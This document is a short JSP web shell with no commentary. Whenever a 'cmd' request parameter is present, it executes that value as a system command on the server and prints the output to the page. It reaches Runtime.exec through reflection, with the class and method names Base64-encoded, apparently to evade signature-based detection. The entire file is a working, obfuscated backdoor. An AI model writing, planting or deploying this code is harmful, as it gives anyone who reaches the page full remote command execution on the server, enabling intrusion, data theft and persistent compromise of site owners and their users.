<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%
    if (request.getParameter("cmd") != null) {
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = null;
        try {
            rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        }
        Process e = null;
        try {
            e = (Process)
                    rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class)
                            .invoke(rt.getMethod(new String(decoder.decodeBuffer("Z2V0UnVudGltZQ==")))
                                    .invoke(null, new Object[]{}), request.getParameter("cmd"));
        } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException ex) {
            throw new RuntimeException(ex);
        }
        java.io.InputStream in = e.getInputStream();
        out.print("<pre>");
        java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
        java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
        String s = null;
        while ((s = stdInput.readLine()) != null) {
            out.println(s);
        }
        out.print("</pre>");
    }
%>